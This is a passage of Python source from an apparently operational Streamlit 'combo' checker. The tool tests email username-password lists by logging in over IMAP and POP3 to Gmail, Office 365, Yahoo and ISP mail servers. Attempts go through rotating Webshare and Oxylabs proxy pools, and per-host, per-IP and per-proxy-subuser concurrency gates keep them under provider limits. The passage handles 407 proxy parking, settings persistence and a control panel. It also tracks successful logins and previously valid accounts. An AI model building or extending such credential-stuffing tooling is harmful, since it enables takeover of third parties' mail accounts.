_GEO_FAIL = STATE.setdefault("geo_fail", {})
_geo_last_call = STATE.setdefault("geo_last_call", {"ts": 0.0})

_PUBLIC_IP = STATE["public_ip"]
_PUBLIC_IP_LOCK = STATE["public_ip_lock"]
_DIRECT_GEO = STATE["direct_geo"]
_DIRECT_GEO_LOCK = STATE["direct_geo_lock"]
_DIRECT_ISP = STATE["direct_isp"]

_SMTP_DOMAIN_CACHE = STATE["smtp_domain_cache"]
_SMTP_LOCK = STATE["smtp_lock"]
_SMTP_CACHE_TTL = 900
_SMTP_PRECHECK_BUDGET = 45.0
_SMTP_PRECHECK_WORKERS = 32

# FIX ISO-4 (v13.49): a teardown never reaches block 106's finally, so the
# runs_active increment it made has to be repaid by somebody. Block 007 is the
# only place that ever PROVES the loop is gone (run_active is process state, so
# it is still set on the load after a teardown while the loop that owned it is
# not), and block 007 runs before STATE exists - so it leaves the debt on the
# session and it is settled here. max(0, ...) means a double repayment cannot go
# negative and strand the prober in busy cadence for ever.
if str_lit.session_state.pop("_run_owed", False):
    _US["runs_active"] = max(0, int(_US.get("runs_active", 0)) - 1)
    STATE["runs_active"] = max(0, int(STATE.get("runs_active", 0)) - 1)
    STATE["run_active"] = STATE["runs_active"] > 0
    log_probe_event(f"teardown repaid: runs_active now {_US['runs_active']}")

# v13.64: FORGET PASSKEY LEFT THE FORGOTTEN USER'S TABLES ALIVE.
# forget_user_state() existed since v13.59 and was called from nowhere, so a
# forgotten key kept its pool, quarantine, scores and its alive-pool thread for
# the life of the process. auth.py now drops the hash it just forgot on the
# session and this is the only place that can act on it. The inequality guard
# means re-unlocking with the SAME passphrase keeps your pool instead of wiping
# it.
_fh = str_lit.session_state.pop("_forgotten_hash", "")
if _fh and _fh != (str_lit.session_state.get("user_key_hash") or ""):
    forget_user_state(_fh)
    # v13.70 ISO-11: THE TABLES WERE DROPPED AND THE BOOKKEEPING ABOUT THEM WAS
    # NOT. proxy_meta_loaded kept the forgotten scope, so a re-unlock of the SAME
    # key found its own scope already "loaded", skipped _load_proxy_meta_file()
    # and ran with an empty score table - every score, country and park for that
    # pool gone until the next probe cycle rebuilt it. The round-robin cursor is
    # shared and pointed into a pool that no longer exists.
    try:
        STATE.setdefault("proxy_meta_loaded", set()).discard(str(_fh))
    except Exception:
        pass
    STATE["rr_last"] = None
    STATE["rr_index"] = 0
    log_probe_event(f"per-user tables dropped for forgotten key {str(_fh)[:8]}")

log_startup("Application process started. Initializing session state and loading configurations...")
log_startup(f"hosts.py status -> loaded={HOSTS_OK} has_ranking={HOSTS_HAS_RANKING} "
            f"merge={_HAVE_HOSTS_MERGE} {HOSTS_IMPORT_NOTE}".strip())
log_startup(f"status.py status -> {STATUS_IMPORT_NOTE}")
log_startup(f"ms_oauth.py status -> loaded={MS_OAUTH_OK} "
            f"(Microsoft XOAUTH2 {'active' if MS_OAUTH_OK else 'inactive'})")

_REBIND_KEYS = (
    "alive_pool", "consecutive_proxy_failures", "circuit_breaker_until",
    "proxy_quarantine", "proxy_quarantine_lock", "strikes_407", "proxy_scheme",
    "proxy_scheme_lock", "proxy_407_until", "proxy_meta", "probe_stats",
    "probe_stats_lock", "probe_log", "probe_log_lock", "probe_owner_lock",
    "failed_domain_cache",
)
_REBIND_ALIAS = {"strikes_407": "_proxy_407", "proxy_scheme": "_proxy_scheme",
                 "proxy_scheme_lock": "_proxy_scheme_lock",
                 "probe_owner_lock": "_PROBE_OWNER_LOCK"}


def _rebind_scope(scope=None):
    """Re-point every per-user module alias at the CALLING thread's tables.

    Module globals are ONE namespace for the whole process, and a rerun in
    another tab rebinds all of them. A pinned thread therefore has to re-assert
    its own binding before it touches them, or it writes into the other user's
    pool. Cost is a thread-local read plus a dict fetch.
    """
    _d = _user_state(scope)
    _g = globals()
    for _k in _REBIND_KEYS:
        _g[_REBIND_ALIAS.get(_k, _k)] = _d[_k]
    _g["_US"] = _d
    return _d
# @@END 039 STATE_ALIASES

# @@BLOCK 040 GATES deps=012,024,025,039
class _NullGate:
    def acquire(self, timeout=None):
        return True

    def release(self):
        pass


_null_gate = _NullGate()


class _Gate:
    """Counted gate whose release() can NEVER raise and whose ceiling can move.

    WHY THIS REPLACES THE OLD BOUNDED LOCK (v13.51)
    ----------------------------------------------
    The old lock's release() raised ValueError("released too many times") when
    the count was already at maximum.  Every gate here was acquired through a
    LOOKUP (`_proxy_gate()`) and released through the same lookup a moment
    later, and `_reset_gates()` POPS those keys - so Apply Settings or Reset
    Defaults, pressed while a run's futures are still executing (the run loop's
    executor is shutdown(wait=False) and nothing cancels the queue), handed the
    release a brand-new lock that had never been acquired.  Over-release.
    ValueError.  The release sits in a `finally`, so the ValueError REPLACED the
    attempt result - a successful login was thrown away - and it was then
    classified RETRY because status.py's _RETRY_HARD matches the word "too many".

    This class fixes all of it: the object is never replaced, the ceiling is
    changed in place, and an unmatched release is simply ignored.
    """

    __slots__ = ("_limit", "_used", "_cv")

    def __init__(self, limit):
        self._limit = max(1, int(limit))
        self._used = 0
        self._cv = threading.Condition()

    def set_limit(self, limit):
        with self._cv:
            self._limit = max(1, int(limit))
            self._cv.notify_all()

    def acquire(self, timeout=None):
        with self._cv:
            end = None if timeout is None else time.time() + float(timeout)
            while self._used >= self._limit:
                if end is None:
                    self._cv.wait(0.25)
                    continue
                left = end - time.time()
                if left <= 0:
                    return False
                self._cv.wait(min(left, 0.25))
            self._used += 1
            return True

    def release(self):
        with self._cv:
            if self._used > 0:
                self._used -= 1
            self._cv.notify()

    def in_use(self):
        with self._cv:
            return self._used


# FIX ISO-5: every gate was keyed by host / IP / sub-user ALONE in ONE process
# table, so two users on one process shared a single PROXY_CONCURRENCY gate and
# halved each other's throughput, and one user's Apply Settings rebuilt the
# other user's live gates underneath it. Every key is prefixed with the SESSION
# scope. The pool itself stays shared on purpose - it describes the provider's
# IPs, not the user - but the THROUGHPUT is now per user.
#
# FIX SCOPE-1 (v13.57): THE SCOPE ITSELF WAS SHARED TOO. _GATE_SCOPE was a plain
# dict refreshed on the script thread and read straight from every worker, so a
# rerun could change the scope underneath a live account: the gate it ACQUIRED and
# the gate it RELEASED were then different objects, and the ceiling it believed in
# doubled or collapsed mid-rung. The value is pinned per thread on first read, the
# script thread owns the refresh, and block 105 pins it explicitly per task.
_GATE_SCOPE = {"id": "anon"}
_GATE_TLS = threading.local()


def _refresh_gate_scope():
    """Re-read the session token. Runs once per rerun on the script thread -
    session_state is not reliable from a worker thread."""
    try:
        tok = (str_lit.session_state.get("user_key_hash")
               or str_lit.session_state.get("_anon_hash")
               or "anon")
    except Exception:
        tok = "anon"
    tok = str(tok) or "anon"
    _GATE_SCOPE["id"] = tok
    try:
        _GATE_TLS.id = tok
    except Exception:
        pass
    return tok


def _pin_gate_scope(tok):
    """Pin the scope on the CALLING thread. Block 105 calls this per task."""
    try:
        _GATE_TLS.id = str(tok) or "anon"
    except Exception:
        pass
    return _gate_scope()


def _gate_scope() -> str:
    """The scope for the CALLING thread - pinned once, then stable for its life."""
    try:
        who = getattr(_GATE_TLS, "id", None)
        if who:
            return who
    except Exception:
        pass
    who = _GATE_SCOPE.get("id") or "anon"
    try:
        _GATE_TLS.id = who
    except Exception:
        pass
    return who


def _gate_table(name):
    tbl = STATE.get(name)
    if tbl is None:
        tbl = {}
        STATE[name] = tbl
    return tbl


def _make_gate(table, key, limit):
    """Fetch the gate for `key`, creating it once. The object is never replaced."""
    g = table.get(key)
    if g is None:
        g = _Gate(limit)
        table[key] = g
    return g


def _limit(cfg_key, default):
    """CFG value, clamped to the SLIDER MINIMUM - never to the default.

    The defaults were raised once without a CFG_VERSION bump, so a config saved
    under the old numbers must not pin a user back. But flooring at the DEFAULT
    also made every concurrency slider lie: HOST_CONCURRENCY could be dragged to
    1 and the engine still used 2, PROXY_SUBUSER_CONCURRENCY could be dragged to
    1 and still used 2. The minimum the slider offers is 1, so floor there and
    let the widget mean what it says.
    """
    try:
        got = int(CFG.get(cfg_key, default))
    except Exception:
        got = int(default)
    return max(1, got)


def _proxy_gate():
    """Global cap on simultaneous proxy tunnels - PER SESSION.

    v13.53: the gate is created under the host-gate lock like the other three.
    _host_gate / _ip_gate / _subuser_gate all take it; this one did not, so two
    workers starting at the same instant could each build a gate for the same
    scope, one was stored and the other was handed to the caller - and the
    global PROXY_CONCURRENCY ceiling briefly doubled, the opposite of what the
    gate exists for.
    """
    _lock = STATE["host_gate_lock"]
    with _lock:
        return _make_gate(_gate_table("proxy_gates"), _gate_scope(),
                          _limit("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT))


def _host_gate(host):
    """Per-destination-HOSTNAME cap so many workers do not slam one IMAP box."""
    if not host:
        return _null_gate
    with STATE["host_gate_lock"]:
        return _make_gate(STATE["host_gates"], _gate_scope() + "|" + host,
                          _limit("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT))


def _ip_gate(ip):
    """Per-PROXY-IP cap.  The PROBER takes it too."""
    if not ip:
        return _null_gate
    with STATE["host_gate_lock"]:
        return _make_gate(STATE["ip_gates"], _gate_scope() + "|" + ip,
                          _limit("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT))


def _subuser_of(proxy_str) -> str:
    """The SUB-USER half of a proxy line - what the provider meters."""
    try:
        info = parse_proxy(proxy_str)
        return (info.get("user") or "").strip().lower() if info else ""
    except Exception:
        return ""


def _subuser_gate(subuser):
    """Per-PROXY-SUBUSER cap - the single most important 407 control."""
    if not subuser:
        return _null_gate
    with STATE["host_gate_lock"]:
        return _make_gate(STATE["subuser_gates"], _gate_scope() + "|" + subuser,
                          _limit("PROXY_SUBUSER_CONCURRENCY",
                                 PROXY_SUBUSER_CONCURRENCY_DEFAULT))


def _reset_gates():
    """Rebuild THIS session's gate LIMITS only - never the objects.

    v13.51: the old body POPPED every key, so a worker that was already holding
    a gate released a fresh one on the way out and raised "released too many
    times". Now the ceiling moves in place, the object identity is stable, and
    live holders are unaffected.
    """
    prefix = _gate_scope() + "|"
    with STATE["host_gate_lock"]:
        for name, cfg_key, dflt in (
                ("host_gates", "HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT),
                ("ip_gates", "PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
                ("subuser_gates", "PROXY_SUBUSER_CONCURRENCY",
                 PROXY_SUBUSER_CONCURRENCY_DEFAULT)):
            tbl = _gate_table(name)
            for k in [k for k in tbl if k.startswith(prefix)]:
                try:
                    tbl[k].set_limit(_limit(cfg_key, dflt))
                except Exception:
                    pass
    _pg = _gate_table("proxy_gates").get(_gate_scope())
    if _pg is not None:
        try:
            _pg.set_limit(_limit("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT))
        except Exception:
            pass
    log_probe_event("concurrency gate limits rebuilt in place (objects kept)")


_refresh_gate_scope()
# @@END 040 GATES

# @@BLOCK 041 PROXY_407_PARK deps=016,039,040
def _proxy_407_parked(proxy_str) -> bool:
    if not proxy_str:
        return False
    _rebind_scope()
    until = (proxy_407_until or {}).get(proxy_str, 0.0)
    return until > time.time()


def _park_proxy(proxy_str, seconds=None):
    """Park a node briefly. A 407 gets the 407 cooldown, a 402 gets the plan one."""
    if not proxy_str:
        return
    try:
        _rebind_scope()
        proxy_407_until[proxy_str] = time.time() + float(
            seconds if seconds is not None else PROXY_407_COOLDOWN)
    except Exception:
        pass


def _park_proxy_407(proxy_str):
    _park_proxy(proxy_str, PROXY_407_COOLDOWN)


def _gated_tunnel(proxy_str, timeout=None, targets=None):
    """Run tunnel_probe() behind the proxy gate, the per-IP gate and the
    per-SUB-USER gate."""
    _rebind_scope()
    info = parse_proxy(proxy_str)
    base_wait = max(3.0, float(timeout if timeout is not None else probe_timeout()) + 2.0)
    wait = _gate_wait(base_wait)
    got_proxy = got_ip = got_sub = False
    pg = _proxy_gate()
    ig = _ip_gate(info["host"] if info else None)
    sg = _subuser_gate((info.get("user") or "").lower() if info else "")
    try:
        try:
            got_proxy = pg.acquire(timeout=wait)
        except Exception:
            got_proxy = False
        try:
            got_ip = ig.acquire(timeout=wait)
        except Exception:
            got_ip = False
        try:
            got_sub = sg.acquire(timeout=wait)
        except Exception:
            got_sub = False
        return tunnel_probe(proxy_str, targets=targets, timeout=timeout)
    finally:
        if got_sub:
            try:
                sg.release()
            except Exception:
                pass
        if got_ip:
            try:
                ig.release()
            except Exception:
                pass
        if got_proxy:
            try:
                pg.release()
            except Exception:
                pass
# @@END 041 PROXY_407_PARK

# @@BLOCK 042 CHECKER_CONFIG deps=009
@dataclass
class CheckerConfig:
    mode_name: str = "Normal"
    fast_mode: bool = False
    max_concurrent_checks: int = 50
    connect_timeout: float = 8.0
    max_retries: int = 2
    failure_cooldown: float = FAILURE_COOLDOWN_DEFAULT
# @@END 042 CHECKER_CONFIG

# @@BLOCK 043 SECRETS_BRIDGE deps=038
def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        # FIX SEC-1: nested [sections] in secrets.toml used to be dropped entirely.
        for _sk, _sv in v.items():
            _secret_to_env(_sk, _sv)
        return
    os.environ[str(k)] = str(v)


try:
    for k, v in str_lit.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

WEBSHARE_KEYS = [line.strip() for line in os.getenv("WEBSHARE_KEYS", "").splitlines()
                 if line.strip()]
OXYLABS_PROXIES = [line.strip() for line in
                   (os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES") or "").splitlines()
                   if line.strip()]
log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_PROXIES)}")
# @@END 043 SECRETS_BRIDGE

# @@BLOCK 044 HELP_WIDGET deps=043
if "help_states" not in str_lit.session_state:
    str_lit.session_state.help_states = {}


def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
    try:
        if key_name not in str_lit.session_state.help_states:
            str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}

        state_data = str_lit.session_state.help_states[key_name]
        if state_data.get("visible", False) and time.time() - state_data.get("time", 0) > 10.0:
            str_lit.session_state.help_states[key_name]["visible"] = False

        col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
        val = None
        with col_lbl:
            if widget_type == "label":
                str_lit.markdown(f"**{label_text}**")
            elif widget_type == "checkbox":
                try:
                    # v13.65: block 045 seeds chk_* from this user's settings.json,
                    # so passing value= as well raises "created with a default value
                    # but also had its value set via the Session State API" on every
                    # rerun. The default is only needed the first time, when the key
                    # does not exist yet.
                    if f"chk_{key_name}" in str_lit.session_state:
                        val = str_lit.checkbox(label_text, key=f"chk_{key_name}")
                    else:
                        val = str_lit.checkbox(label_text, value=kwargs.get("value", False),
                                               key=f"chk_{key_name}")
                except Exception as widget_err:
                    str_lit.error(f"Widget payload/input error: {widget_err}")
                    val = kwargs.get("value", False)
            elif widget_type in ("text", "selectbox"):
                str_lit.markdown(f"**{label_text}**")

        with col_btn:
            if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
                try:
                    current = str_lit.session_state.help_states[key_name]["visible"]
                    str_lit.session_state.help_states[key_name] = {
                        "visible": not current, "time": time.time()}
                except Exception as btn_err:
                    warnings.warn(f"State transition error in help button: {btn_err}")

        if str_lit.session_state.help_states[key_name]["visible"]:
            str_lit.sidebar.markdown(
                f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

        if widget_type == "checkbox":
            return val
    except Exception as e:
        warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
    return None
# @@END 044 HELP_WIDGET

# @@BLOCK 045 SETTINGS_RESET deps=019,020,024,040,043
# ===========================================================================
# SETTINGS PERSISTENCE (v13.61)
#
# THE BUG: every settings widget key lived in session_state and NOTHING was ever
# written to disk, so a refresh, a tab close, a reaped session or a redeploy reset
# the whole panel to the hardcoded defaults - and "Apply Settings" only ever wrote
# session_state, so it could not survive the thing it looked like it was saving.
# It is a per-user file, because two people on one deployment must not inherit
# each other's engine settings.
#
# ORDER IS THE POINT: this block runs BEFORE the widgets in 046-053 exist, so
# assigning a key here is legal. Doing it in 055 would raise
# StreamlitWidgetAlreadyInstantiatedError on every key.
#
# The OWNER GATE runs first. After a Forget and a second unlock in the same tab,
# session_state still holds the previous user's values, so the new user used to
# inherit them; on an owner change every settings key is dropped and re-seeded
# from the new owner's own file.
# ===========================================================================
_SETTINGS_FILE_NAME = "settings.json"
_SETTINGS_SCHEMA = 1

# key -> (kind, low, high, choices). A saved value is validated on the way IN, so a
# value that no longer fits its widget (a narrowed slider, a renamed option) can
# never raise on the way out.
_SETTING_KINDS = {
    "ui_font_size": ("int", 12, 22, None),
    "ui_content_scale": ("int", 80, 140, None),
    "ui_mode": ("choice", 0, 0, ("Normal Mode", "Fast Mode", "Deep / Aggressive Mode")),
    "ui_protocols": ("subset", 0, 0, tuple(PROTOCOL_OPTIONS)),
    "ui_workers": ("int", 1, 100, None),
    "ui_deadline": ("int", 10, 400, None),
    "ui_timeout": ("int", 3, 60, None),
    "ui_max_acc": ("int", 0, 5000, None),
    "ui_blacklist_cf": ("int", 3, 100, None),
    "ui_dynamic_scaling": ("bool", 0, 0, None),
    "ui_max_hosts": ("int", 1, 8, None),
    "ui_alt_user": ("bool", 0, 0, None),
    "ui_confirm_wrong": ("bool", 0, 0, None),
    "ui_smtp_precheck": ("bool", 0, 0, None),
    "ui_min_proxy_score": ("int", 0, 100, None),
    "ui_probe_precheck_timeout": ("int", 1, 10, None),
    "ui_probe_timeout": ("int", 3, 20, None),
    "ui_probe_target": ("choice", 0, 0, tuple(PROBE_TARGET_OPTIONS)),
    "ui_probe_strict": ("bool", 0, 0, None),
    "ui_probe_maxtargets": ("int", 1, 3, None),
    "ui_probe_scheme2": ("bool", 0, 0, None),
    "ui_prober_idle": ("bool", 0, 0, None),
    "ui_probe_sample": ("int", 0, 200, None),
    "ui_mail_spot": ("bool", 0, 0, None),
    "ui_dedupe": ("bool", 0, 0, None),
    "ui_allow_blacklist": ("bool", 0, 0, None),
    "ui_quarantine": ("bool", 0, 0, None),
    "ui_host_conc": ("int", 1, 12, None),
    "ui_ip_conc": ("int", 1, 12, None),
    "ui_subuser_conc": ("int", 1, 12, None),
    "ui_proxy_conc": ("int", 2, 60, None),
    "ui_direct_first": ("bool", 0, 0, None),
    "ui_same_host_retries": ("int", 0, 4, None),
    "ui_max_rot": ("int", 0, 8, None),
    "ui_pass2": ("bool", 0, 0, None),
    "ui_random_rot": ("bool", 0, 0, None),
    "ui_geo_call": ("bool", 0, 0, None),
    "ui_conn_hint": ("choice", 0, 0, ("Auto", "VPN ON", "VPN OFF")),
    "ui_starttls": ("bool", 0, 0, None),
    "ui_proxy_mode": ("choice", 0, 0, ("aggressive", "fallback", "sticky", "off")),
    "chk_use_proxy": ("bool", 0, 0, None),
    "chk_retry_cf": ("bool", 0, 0, None),
    "chk_self_signed": ("bool", 0, 0, None),
    "chk_proxy_test_flight": ("bool", 0, 0, None),
    "chk_skip_app": ("bool", 0, 0, None),
    "chk_debug_mode": ("bool", 0, 0, None),
    "bb_whitelist": ("text", 0, 0, None),
    "bb_blacklist": ("text", 0, 0, None),
    # v13.70: these two carried keys but no persistence entry, so a refresh put
    # them back to their seed every single time - "Skip previously valid" was
    # undone by any reload, which silently re-checked accounts the user had
    # deliberately excluded. A bool entry is enough: the seed in 087/108 supplies
    # the default, this supplies the memory.
    "bb_skip_prev": ("bool", 0, 0, None),
    "bb_sum_full": ("bool", 0, 0, None),
    "pool_mode": ("choice", 0, 0, ("all", "us_only", "country", "mix")),
}

_MISSING = object()


def _settings_path():
    try:
        return user_file(_SETTINGS_FILE_NAME)
    except Exception:
        return _SETTINGS_FILE_NAME


def _settings_coerce(key, value):
    """A saved value made legal for its widget, or _MISSING if it is not."""
    spec = _SETTING_KINDS.get(key)
    if not spec:
        return _MISSING
    kind, lo, hi, choices = spec
    try:
        if kind == "bool":
            return bool(value)
        if kind == "int":
            return max(lo, min(hi, int(value)))
        if kind == "choice":
            return value if value in choices else _MISSING
        if kind == "subset":
            if not isinstance(value, list):
                return _MISSING
            got = [v for v in value if v in choices]
            return got or _MISSING
        if kind == "text":
            return str(value)[:2000]
    except Exception:
        return _MISSING
    return _MISSING


def _load_settings_file():
    """This user's saved dict, or {}. Never raises."""
    path = _settings_path()
    if not os.path.exists(path):
        return {}
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        warnings.warn(f"settings.json unreadable ({e}); using defaults")
        return {}
    vals = data.get("values") if isinstance(data, dict) else None
    return vals if isinstance(vals, dict) else {}


def _seed_settings_from_disk():
    """Put this user's saved settings into the widget keys. Once per session."""
    saved = _load_settings_file()
    applied = 0
    for key, value in saved.items():
        got = _settings_coerce(key, value)
        if got is _MISSING:
            continue
        try:
            str_lit.session_state[key] = list(got) if isinstance(got, list) else got
            applied += 1
        except Exception:
            pass
    picked = saved.get("picked_countries")
    if isinstance(picked, list) and picked:
        try:
            str_lit.session_state["picked_countries"] = [str(c) for c in picked][:40]
        except Exception:
            pass
    return applied


def _save_settings_to_disk(reason="apply", overrides=None):
    """Persist this user's settings. Called on Apply and on Reset only."""
    vals = {}
    for key in _SETTING_KINDS:
        if key not in str_lit.session_state:
            continue
        got = _settings_coerce(key, str_lit.session_state.get(key))
        if got is _MISSING:
            continue
        vals[key] = got
    if overrides:
        vals.update(overrides)
    payload = {"schema": _SETTINGS_SCHEMA,
               "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
               "reason": reason, "values": vals,
               "picked_countries":
                   [str(c) for c in (str_lit.session_state.get("picked_countries") or [])][:40]}
    path = _settings_path()
    tmp = path + ".tmp"
    try:
        with file_write_lock:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=1)
            os.replace(tmp, path)
        return True
    except Exception as e:
        warnings.warn(f"could not save settings.json: {e}")
        return False


# ---- owner gate: a different unlock in this tab must not inherit the last one
_settings_owner = _cache_owner()
if str_lit.session_state.get("_settings_owner") != _settings_owner:
    for _sk in list(_SETTING_KINDS):
        str_lit.session_state.pop(_sk, None)
    str_lit.session_state.pop("picked_countries", None)
    str_lit.session_state["_settings_owner"] = _settings_owner
    str_lit.session_state["_settings_seeded"] = False

if not str_lit.session_state.get("_settings_seeded"):
    str_lit.session_state["_settings_seeded"] = True
    _fit_before = (str_lit.session_state.get("ui_font_size"),
                   str_lit.session_state.get("ui_content_scale"))
    _n_seeded = _seed_settings_from_disk()
    if _n_seeded:
        log_startup(f"Settings restored from this user's settings.json "
                    f"({_n_seeded} value(s)).")
    # v13.61: auth.fit() at block 007 has ALREADY painted the CSS from the
    # PRE-seed values, and a seeded Display Fit pair would otherwise only reach
    # the CSS on the next rerun - so the slider would read the saved size while
    # the page still rendered the default one. Repaint here so the first paint
    # agrees with the widget. A second fit() is safe: it only assigns the two
    # keys (fit_panel has not created the sliders yet) and re-injects the sheet.
    if (str_lit.session_state.get("ui_font_size"),
            str_lit.session_state.get("ui_content_scale")) != _fit_before:
        try:
            auth.fit(str_lit)
        except Exception:
            pass


def _apply_settings_reset(reason: str = "Reset Defaults"):
    """Restore EVERY settings widget to its default and stamp applied_cfg from
    the pure-constant default_cfg()."""
    for k, v in SETTING_DEFAULTS.items():
        try:
            str_lit.session_state[k] = list(v) if isinstance(v, list) else v
        except Exception:
            pass
    # v13.45: ui_font_size / ui_content_scale are created by auth.fit() in block
    # 007, which has ALREADY run by the time this executes - so assigning them in
    # the loop above raises StreamlitWidgetAlreadyInstantiatedError and is
    # swallowed. They were therefore the only two settings Reset Defaults could
    # never restore. Hand the pair to auth.fit() through its own one-shot flag;
    # fit() consumes it at the top of the next run, where assigning is legal.
    try:
        str_lit.session_state["_fit_reset"] = True
    except Exception:
        pass
    try:
        str_lit.session_state.pool_mode = "all"
        str_lit.session_state.pool_locked = True
        str_lit.session_state.pool_pick = None
        str_lit.session_state.picked_countries = []
    except Exception:
        pass
    try:
        str_lit.session_state.applied_cfg = default_cfg()
        str_lit.session_state.applied_cfg_version = CFG_VERSION
    except Exception:
        pass
    try:
        str_lit.session_state["_bb_prefilter_cache"] = None
    except Exception:
        pass
    # v13.61: the reset is written to disk too, otherwise the next refresh
    # reloads the very values it just cleared. The Display Fit pair is forced into
    # the payload because its two session assignments above are the swallowed ones.
    _save_settings_to_disk("reset", {"ui_font_size": SETTING_DEFAULTS["ui_font_size"],
                                     "ui_content_scale": SETTING_DEFAULTS["ui_content_scale"]})
    _reset_gates()
    log_startup(f"All settings reset to UNIVERSAL DEFAULTS by {reason}.")
    log_probe_event(f"settings reset to universal defaults ({reason})")


_reset_all_settings = _apply_settings_reset

if str_lit.session_state.pop("_bb_reset_pending", False):
    _apply_settings_reset("Reset Defaults button")
    # The flag above is consumed by auth.fit() at block 007, which has already
    # run. Rerun once so the widgets are rebuilt from the new values - both the
    # ones assigned here and the Display Fit pair.
    str_lit.rerun()
# @@END 045 SETTINGS_RESET

# @@BLOCK 046 SIDEBAR_MODE deps=009,017,019,042,043,044
str_lit.sidebar.header("⚙ Engine Control Panel")
str_lit.sidebar.caption(
    "Universal defaults are pre-set for ANY mix of combos (Gmail / O365 / Yahoo / "
    "legacy ISP). The engine dials IMAP + POP3 by default, so a legacy IMAP front "
    "that sends '* BYE' has a second, independent protocol to fall back to."
)
str_lit.sidebar.caption(
    "ℹ️ Seeing **`TypeError: Importing a module script failed.`** in red? That is the "
    "BROWSER holding a stale JavaScript chunk after a redeploy - hard-refresh the tab "
    "(Ctrl/Cmd+Shift+R). It is not an app error."
)

# Display Fit is NOT defined here. auth.fit() (block 007) already owns
# ui_font_size / ui_content_scale and renders them in the 🔎 Display Fit expander.
# A second pair with the same keys is an instant StreamlitDuplicateElementKey -
# and its 80-140 percent range fought fit_css()'s factor clamp.
str_lit.sidebar.subheader("🔎 Display Fit")
str_lit.sidebar.caption("The sliders live in the Display Fit box at the top of the page.")

str_lit.sidebar.markdown("---")

_MODE_OPTIONS = ("Normal Mode", "Fast Mode", "Deep / Aggressive Mode")

# v13.63: THE LAST THREE "default value but also Session State API" WARNINGS IN
# THIS BLOCK. ui_mode, ui_max_acc and ui_blacklist_cf were the remaining widgets
# here created with a default AND a key=, while block 045 has already written
# that same key from this user's settings.json - so every single load warned
#
#   "The widget with key 'ui_max_acc' was created with a default value but also
#    had its value set via the Session State API."
#
# The positional default is dropped below and the key is SEEDED AND CLAMPED here
# instead - the identical shape the three sliders further down already use, and
# the shape that keeps ui_workers / ui_deadline / ui_timeout silent.
#
# THE SEED IS NOT OPTIONAL. Block 045 only seeds keys that are SAVED on disk, so
# a fresh user has none at all; without this loop the sliders would fall back to
# their MINIMUM (0 accounts, 3 fails) instead of the documented defaults. The
# clamp also matters: a value saved under an older, wider range would otherwise
# sit outside the slider and Streamlit would refuse to draw it.
if str_lit.session_state.get("ui_mode") not in _MODE_OPTIONS:
    str_lit.session_state["ui_mode"] = SETTING_DEFAULTS.get("ui_mode", "Normal Mode")
for _k, _lo, _hi in (("ui_max_acc", 0, 5000), ("ui_blacklist_cf", 3, 100)):
    _dv = int(SETTING_DEFAULTS.get(_k, _lo))
    _v = str_lit.session_state.get(_k)
    if not isinstance(_v, int):
        try:
            _v = int(_v)
        except Exception:
            _v = _dv
    str_lit.session_state[_k] = max(_lo, min(_hi, _v))

checker_mode = str_lit.sidebar.selectbox(
    "⚡ Select Engine Mode:",
    options=list(_MODE_OPTIONS),
    key="ui_mode",
    help="Normal: balanced and safe for legacy ISP IMAP. Fast: syntax + MX pre-filter, "
         "rapid ports. Deep: maximum depth, multiple fallbacks, strict validation."
)
# v13.42: ui_workers / ui_deadline / ui_timeout are the SAME widget keys in all
# three branches, but each branch declares DIFFERENT ranges, so a mode switch
# could leave a stored value outside the new slider's range.  Clamp to the mode
# we are about to render - legal here, the widgets do not exist yet this run.
#
# FIX W-1 (v13.49): the clamp used to write the key AND each slider still passed
# a positional `value=`, which raises
#   "The widget with key "ui_workers" was created with a default value but also
#    had its value set via the Session State API."
# on every single run. The value is seeded here and the sliders pass only step=
# and key= - the same shape block 056 already uses for th_radius.
_bounds = {"Fast Mode": ((1, 100), (10, 300), (3, 40)),
           "Deep / Aggressive Mode": ((1, 50), (15, 400), (5, 60))}.get(
    checker_mode, ((1, 100), (10, 300), (3, 40)))
_defaults = {"Fast Mode": (WORKERS_FAST, int(DEADLINE_FAST), ATTEMPT_TIMEOUT_FAST),
             "Deep / Aggressive Mode": (WORKERS_DEEP, int(DEADLINE_DEEP),
                                        ATTEMPT_TIMEOUT_DEEP)}.get(
    checker_mode, (WORKERS_NORMAL, int(DEADLINE_NORMAL), ATTEMPT_TIMEOUT_NORMAL))
for _k, (_lo, _hi), _dv in zip(("ui_workers", "ui_deadline", "ui_timeout"),
                               _bounds, _defaults):
    _v = str_lit.session_state.get(_k)
    if not isinstance(_v, int):
        _v = _dv
    str_lit.session_state[_k] = max(_lo, min(_hi, _v))

if checker_mode == "Fast Mode":
    engine_config = CheckerConfig(mode_name="Fast", fast_mode=True, max_concurrent_checks=100,
                                  connect_timeout=5.0, max_retries=1, failure_cooldown=60.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, step=1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, step=5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 3, 40, step=1, key="ui_timeout")
    default_hosts = 2
elif checker_mode == "Deep / Aggressive Mode":
    engine_config = CheckerConfig(mode_name="Deep", fast_mode=False, max_concurrent_checks=30,
